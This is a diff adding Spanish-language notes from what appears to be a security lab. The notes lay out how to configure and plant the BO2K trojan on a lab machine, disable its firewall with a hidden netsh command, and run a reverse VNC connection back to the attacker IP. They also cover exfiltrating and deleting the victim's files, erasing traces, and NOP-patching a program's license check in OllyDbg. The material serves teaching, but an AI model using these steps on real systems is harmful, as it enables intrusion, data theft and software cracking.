@@ -1,0 +1,156 @@
+Asignar ips:
+Panel de Control>Conexiones de Red
+Doble click en la conexión existente>Propiedades.
+- Marcar TCP/IP y mostrar sus Propiedades.
+- Indicar que se conectará con la IP que se introducirá.
+- Introducir la IP (la máscara se introducirá sola) y aceptar.
+
+RyS-TheFarm: 192.168.1.2
+RyS-Abstergo: 192.168.1.3
+
+En RyS-TheFarm:
+
+BO2K: Configuración
+Abrir la carpeta Piri Reis
+Hacer una copia de bO2k y llamarla HiddenBlace
+Abrir bo2kcfg:
+- Insertar plugins io/io_tcp.dll y cambiar el valor de default port a 9090
+- Insertar plugin auth/auth_null.dll
+- Insertar plugin enc/enc_null.dll
+¿Qué diferencias hay entre TCP y UDP?
+TCP tiene control de conexiones y de errores y UDP no.
+
+Las categorías Startup y Stealth forman parte del núcleo del servidor y
+los valores de sus variables tienen que ser actualizadas/revisadas.
+a. Init Cmd Net Type tiene que ser TCPIO.
+b. Init Cmd Bind Str debe contener el puerto escogido para la
+conexión.
+c. Init Cmd Encryption y Init Cmd Auth deben estar a NULL (o
+NULLAUTH en la segunda variable).
+
+Añadir los siguientes plugins:
+a. srv_control. Permite las funciones básicas del servidor.
+b. srv_regfile. Modificar/revisar las variables de tipo de red, encriptación y autenticación para que coincidan con lo ya introducido antes.
+c. srv_system. Permite navegar por el sistema de ficheros remoto y usar ejecutables.
+d. srv_legacy. Mecanismos nativos de comprensión de ficheros muy útiles cuando transfieren grandes cantidades de datos.
+
+Salvar los cambios en el servidor y salir.
+Copiar el ejecutable en el pincho USB y extraerlo.
+
+En RyS-Abstergo:
+
+BO2K: Inoculación
+Introducir el pincho USB.
+Ejecutar HiddenBlade.
+Indicar al Firewall de Windows que se desea no bloquear el programa.
+Extraer el pincho USB.
+Ejecutar en una terminal:
+- netstat -an para verificar que el troyano ha abierto el puerto deseado.
+- ipconfig para anotar la IP.
+
+En RyS-TheFarm:
+
+BO2K: Conexión y uso
+Ejecutar bo2kgui.
+En la sección de plugins, insertar los empleados en el servidor para definir la encriptación, la autenticación y el protocolo de conexión
+(modificar convenientemente el puerto).
+Añadir el plugin cli_botools y modificar/revisar las variables
+5. Añadir los siguientes plugins:
+a. srv_control. Permite las funciones básicas del servidor.
+b. srv_regfile. Modificar/revisar las variables de tipo de red,
+encriptación y autenticación para que coincidan con lo ya
+introducido antes.
+c. srv_system. Permite navegar por el sistema de ficheros remoto y
+usar ejecutables.
+d. srv_legacy. Mecanismos nativos de comprensión de ficheros
+
+Ahora es el momento de crear una conexión con la máquina objetivo.
+1. Ir a File->New Server e introducir los siguientes datos:
+a. Nombre de la máquina: Abstergo.
+b. Dirección: la IP anotada anteriormente.
+2. Al hacer doble click sobre el servidor que se acaba de añadir, aparecerán
+todas las opciones para el mismo. Conectar con la máquina objetivo.
+3. A través de las opciones nuevas que aparecen, obtener:
+a. Información de la máquina remota.
+b. Procesos en ejecución.
+c. Plugins del servidor.
+System/ GetSystemInfo
+Process Control/ List Process ó Start Process
+Server Control/ List plugins
+4. Se desactivará el cortafuegos remoto usando la opción de comenzar un nuevo proceso.
+a. El proceso será oculto.
+b. El comando asociado al proceso será: netsh firewall set opmode disable.
+
+Process Control/ Start Process
+0=Show 1=Hide - 1
+Path and arguments: netsh firewall set opmode disable
+
+VNC: Despliegue
+
+Ahora se hará uso de las BO Tools, que se cargaron en el cliente con el plugin correspondiente, para instalar un servidor Virtual Network Computing (VNC).
+1. Acceder al navegador del sistema de archivos (menú Plugins).
+2. Conectar con la máquina objetivo.
+3. Comenzar a navegar en la unidad c: y acceder a la carpeta Animus,
+ubicado en el Escritorio del usuario John.
+4. Subir el ejecutable winvnc_SCIII.exe que puede encontrarse en la carpeta vnc, que a su vez se encuentra en la carpeta Piri Reis.
+
+El siguiente paso será utilizar el servidor VNC para que actúe de forma inversa,
+esto es, que en vez de aceptar conexiones, sea él quien conecte al cliente.
+1. En local, arrancar desde la terminal el ejecutable vncviewer_ssl.exe,
+ubicado también en la carpeta VNC, pasándole como parámetro: -listen.
+2. No emplear las BO Tools, ya que no permiten la ejecución con parámetros.
+3. Volver a subir el cortafuegos.
+4. Ejecutar el servidor VNC usando la misma funcionalidad empleada para bajar el cortafuegos:
+a. El proceso será oculto.
+b. El parámetro será: -connect IP:5500, siendo IP la de la máquina
+en la que se inició el cliente.
+c:\Documents and Settings\John\Desktop\Animus\winvnc_SCIII.exe -connect 192.168.1.2:5500
+
+VNC: Conexión y uso
+Una vez arrancado el servidor, éste se conectará al cliente, saliendo un diálogo que se deberá aceptar. Enseguida cargará una visualización del escritorio de la máquina objetivo, así como una barra de herramientas en la parte de arriba. 
+1. Visualizar el contenido de la carpeta Profiles, dentro de la carpeta Animus.
+2. A través del gestor de transferencias de ficheros:
+a. Copiar en una carpeta (creada fuera de la aplicación) los archivos de la carpeta remota Profiles. Borrar los archivos de la ubicación remota.
+b. Copiar AnimusPatch.EXE.
+
+Borrado de huellas
+Ahora toca borrar los ejecutables y archivos asociados a bo2k y VNC. Esto se hará a través del primero.
+1. Salir de VNC.
+2. A través de las BO Tools, borrar el servidor VNC.
+3. A través del cliente estándar de bo2k, apagar el servidor (Shutdown),
+indicando que se quiere erradicar
+
+
+Crack de la aplicación
+
+¿A qué corresponde el registro EIP?
+Registro EIP (Extended Instruction Pointer): Este registro apunta a la siguiente dirección de memoria que el procesador va a ejecutar.
+El PC vamos.
+¿Cuántos NOP aparecen? ¿Por qué? PISTA: La instrucción NOP ocupa 1 byte
+2 NOP. Porque que le especificas que rellene con NOP
+¿Por qué se ha pausado OllyDbg?
+Porque había un breakpoint
+¿Qué ha habido diferente de la ejecución anterior?
+Access violation when reading 00000000 y suena el beep de acceso con exito.
+¿A qué dirección se ha movido el desensamblador?
+Direccion rutina API &USER32.MessageBoxA: 0x0040143A
+¿Está en el espacio de direcciones de AnimusPatch? ¿Por qué?
+Porqué necesita llamarse a esa rutina para cargar la caja de los mensajes.
+¿En qué dirección comienza el mensaje de error? ¿y el de éxito?
+Mensaje de ERROR:0x00401362
+Mensaje de ÉXITO:0x0040134D
+
+Referencias a &USER32.MessageBoxA:
+0x00401378
+0x0040135c
+0x004013bc
+
+401241 - Introduces valores
+401253 - ENTER
+
+¿Qué indica el Flag Z y en base a qué obtiene su valor en el programa?
+El flag Z indica si es correcta la autenticación
+Crackear el programa con instrucciones NOP
+401243-24C NOP
+
+Una solución más limpia es observar que hace el programa poniendo breakpoints como hace este usuario aquí: https://www.youtube.com/watch?v=dQWpVKMTeJc
